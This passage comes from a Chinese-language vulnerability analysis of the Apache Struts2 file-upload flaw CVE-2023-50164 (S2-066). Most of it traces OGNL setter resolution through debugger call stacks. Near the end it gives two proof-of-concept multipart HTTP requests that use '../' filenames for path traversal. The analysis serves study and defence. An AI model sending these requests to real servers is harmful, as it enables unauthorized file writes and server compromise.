																->OgnlRuntime#getSetMethod
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2049.png)

又通过 `_getSetMethod` 来获得 `setter` , 步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#hasSetProperty
															->OgnlRuntime#hasSetMethod
																->OgnlRuntime#getSetMethod
																	->OgnlRuntime#_getSetMethod
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2050.png)

因为返回的是 `Method`, 所以我们只看对 `methods` 相关部分即可, 在1823行调用了 `getDeclaredMethods` 函数,顾名思义获取公共方法, 步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#hasSetProperty
															->OgnlRuntime#hasSetMethod
																->OgnlRuntime#getSetMethod
																	->OgnlRuntime#_getSetMethod
																		->OgnlRuntime#getDeclaredMethods
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2051.png)

可以看到有个关于 `basename` 的变量, 是由 `capitalizeBeanPropertyName` 函数赋值的, 获取大写的属性名

步入查看

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#hasSetProperty
															->OgnlRuntime#hasSetMethod
																->OgnlRuntime#getSetMethod
																	->OgnlRuntime#_getSetMethod
																		->OgnlRuntime#getDeclaredMethods
																			->OgnlRuntime#capitalizeBeanPropertyName
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2052.png)

审计一下不难看出进行了四种判断

1. 如果属性名长度为1, 那么返回属性名大写
2. 如果属性名以 `get` 开头, 以 `()` 结尾, 且第4位为大写字母, 直接返回属性名
3. 如果属性名以 `set` 开头, 以 `)` 结尾, 且第4位为大写字母, 直接返回属性名
4. 如果属性名以 `is` 开头, 以 `()` 结尾, 且第3位为大写字母, 直接返回属性名
5. 获取属性名的第一二位, 再进行判断
    1. 如果第一位是小写字母, 第二位是大写字母, 直接返回属性名
    2. 其他情况, 属性名首字母大写并返回

运行一下

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2053.png)

返回

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#hasSetProperty
															->OgnlRuntime#hasSetMethod
																->OgnlRuntime#getSetMethod
																	->OgnlRuntime#_getSetMethod
																		->OgnlRuntime#getDeclaredMethods
```

往下看, 来到 *`collectAccessors`,* 步入

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2054.png)

(挺奇怪的, 一开始 `basename` 跑出来是空的, 把服务重启重新调试之后又匹配到 `Upload` 了)

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#hasSetProperty
															->OgnlRuntime#hasSetMethod
																->OgnlRuntime#getSetMethod
																	->OgnlRuntime#_getSetMethod
																		->OgnlRuntime#getDeclaredMethods
																			->OgnlRuntime#collectAccesso
```

当运行完 `c.getDeclaredMethods();` 可以看到, `UploadAction` 类中所有方法已经被获取了

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2055.png)

接着对获取的方法来了一个循环

1. 如果方法是一个接口, 过
2. 如果方法可以调用, 执行 `addIfAccessor`

看一下 `addIfAccessor` 里发生了什么, 第一个函数是 `getUpload()`, 肯定是可以通过 if 的

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2056.png)

步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#hasSetProperty
															->OgnlRuntime#hasSetMethod
																->OgnlRuntime#getSetMethod
																	->OgnlRuntime#_getSetMethod
																		->OgnlRuntime#getDeclaredMethods
																			->OgnlRuntime#collectAccessor
																				->OgnlRuntime#addIfAccessor
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2057.png)

还是进行了一系列判断, 满足判断的方法会被加入到 `result` 这个 list 中

1. 方法名要以 `basename` 结尾
    1. 以 `set` 或 `get` 或 `is` 开头
        1. `basename` 的长度=方法名长度-前缀长度(`findSets`默认为 true 不管)

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2058.png)

通过这个函数, 筛选出了 `setter` 

![Screenshot_20231221_131901.png](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Screenshot_20231221_131901.png)

从 `ParametersInterceptor#setParameters` 迭代开始, 就是为了寻找 ac 上下文中文件信息在 `UploadAction` 里对应的 `setter`

上面展示的就是寻找 `setUpload` 的调试过程

### Part 3.3

回到 `CompoundRootAccessor#setProperty`

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2059.png)

通过了 `OgnlRuntime#hasSetProperty` 判断, 我们来到 `OgnlRuntime#setProperty`, 步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#setProperty
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2060.png)

步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#setProperty
															->accessor#setProperty
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2061.png)

步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#setProperty
															->accessor#setProperty
																->ObjectPropertyAccessor#setProperty
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2062.png)

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#setProperty
															->accessor#setProperty
																->ObjectPropertyAccessor#setProperty
																	->ObjectPropertyAccessor#setPossibleProperty
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2063.png)

步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#setProperty
															->accessor#setProperty
																->ObjectPropertyAccessor#setProperty
																	->ObjectPropertyAccessor#setPossibleProperty
																		->OgnlRuntime#setMethodValue
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2064.png)

步入

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#setProperty
															->accessor#setProperty
																->ObjectPropertyAccessor#setProperty
																	->ObjectPropertyAccessor#setPossibleProperty
																		->OgnlRuntime#setMethodValue
																			->OgnlRuntime#callAppropriateMethod
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2065.png)

再往后步入, 成功调用 `setUpload`

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2066.png)

调用栈如下

```
setUpload:24, UploadAction (com.struts2)
invoke:-1, GeneratedMethodAccessor24 (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
invokeMethodInsideSandbox:1245, OgnlRuntime (ognl)
invokeMethod:1230, OgnlRuntime (ognl)
callAppropriateMethod:1958, OgnlRuntime (ognl)
setMethodValue:2196, OgnlRuntime (ognl)
setPossibleProperty:98, ObjectPropertyAccessor (ognl)
setProperty:175, ObjectPropertyAccessor (ognl)
setProperty:42, ObjectAccessor (com.opensymphony.xwork2.ognl.accessor)
setProperty:3359, OgnlRuntime (ognl)
setProperty:84, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor)
setProperty:3359, OgnlRuntime (ognl)
setValueBody:134, ASTProperty (ognl)
evaluateSetValueBody:220, SimpleNode (ognl)
setValue:308, SimpleNode (ognl)
setValue:829, Ognl (ognl)
lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
execute:-1, 1385670583 (com.opensymphony.xwork2.ognl.OgnlUtil$$Lambda$57)
compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl)
trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl)
setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl)
setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl)
setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
doIntercept:144, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
```

# 漏洞利用

两种POC

```
POST /apachestrutsdemo_war_exploded/upload.action HTTP/1.1
Host: 127.0.0.1:8082
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 188
Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
Content-Disposition: form-data; name="Upload"; filename="../1.txt"
Content-Type: text/plain

1aaa
--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--
Content-Disposition: form-data; name="uploadFileName"

../123.txt
--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--
```

```
POST /apachestrutsdemo_war_exploded/upload.action?uploadFileName=../123.txt HTTP/1.1
Host: 127.0.0.1:8082
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 188
Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
Content-Disposition: form-data; name="Upload"; filename="../1.txt"
Content-Type: text/plain

1aaa
--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--
```

**总结**

造成变量覆盖的根本原因就是 `acceptableParameters` 为 `TreeMap`,  Ascii 码大的值靠前排

根据 POC, 在 `ParametersInterceptor#setParameters` 中循环调用 `setter` 赋值的顺序为

1. `Upload`
2. `UploadContentType`
3. `UploadFileName`
4. `uploadFileName`

虽然 `uploadFileName` 并不是 `UploadAction` 的属性, 但是别忘了在寻找 `setter` 时, 经过了 `OgnlRuntime#capitalizeBeanPropertyName`, 被处理后成了 `UploadFileName`, 所以就能找到对应的 `setUploadFileName` 方法

**最后就是说执行了两次 `setUploadFileName`, 第一次赋值为正常的 1.txt, 第二次则成了 ../123.txt**

来做组测试

通过利用 upload 和 uploadFileName 两个参数进行上传

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2067.png)

能够上传文件, 但无法目录穿越, 调试一下在 `ParametersInterceptor#setParameters` 处也可以看到 ../123.txt 没有被解析到其中

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2068.png)

利用局限

<aside>
💡 **目录穿越无法发生在 Struts 框架中，根据 S2 历史漏洞的特点，只能是在二次开发的业务代码中。**

</aside>

只能是在开发人员对upload处理不严格时,可能会造成漏洞

而且很显然的是我们构造的数据包中, `name="Upload";`, 要与处理 `UploadAction` 类中的属性一致

不然 `inputname` 与 `ContentType` 拼接得到的 `inputnameContentType`, 与 `FileName` 拼接得到的`inputnameFileName`, 在`UploadAction` 类也找不到对应的 `setter`

参考文章

**[Apache Struts2 文件上传分析(S2-066)](https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/)**

**[【漏洞分析】Apache Struts2 文件上传漏洞（CVE-2023-50164/S2-066）-保姆版](https://mp.weixin.qq.com/s?__biz=MzkxMTUyMjUxMw==&mid=2247517512&idx=1&sn=abef185d1d5de9f669fc7c1b5aa901e0&chksm=c1182af6f66fa3e0fc0eaae7b17df72fb204e51adca024b35ad61a7a926c0568c950239f43ea&mpshare=1&scene=1&srcid=1213VtnAcpHuYT3Np1xEk1Q0&sharer_shareinfo=a7da8a7a5e78b35f2a1f37ebff58a729&sharer_shareinfo_first=a7da8a7a5e78b35f2a1f37ebff58a729#rd)**